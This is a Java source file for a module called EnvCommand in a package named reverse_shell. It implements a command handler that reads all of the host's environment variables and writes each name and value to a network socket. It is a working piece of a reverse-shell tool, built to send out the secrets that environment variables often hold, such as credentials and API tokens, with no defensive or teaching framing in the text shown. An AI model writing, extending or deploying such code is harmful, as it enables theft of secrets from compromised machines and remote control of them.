package reverse_shell.modules;

import reverse_shell.CommandHandler;
import java.net.Socket;
import java.io.OutputStream;
import java.util.Map;

public class EnvCommand implements CommandHandler {
    @Override
    public void handle(String[] args, Socket socket) throws Exception {
        OutputStream out = socket.getOutputStream();
        Map<String, String> env = System.getenv();
        for (Map.Entry<String, String> entry : env.entrySet()) {
            String line = entry.getKey() + "=" + entry.getValue() + "\n";
            out.write(line.getBytes());
        }
    }
}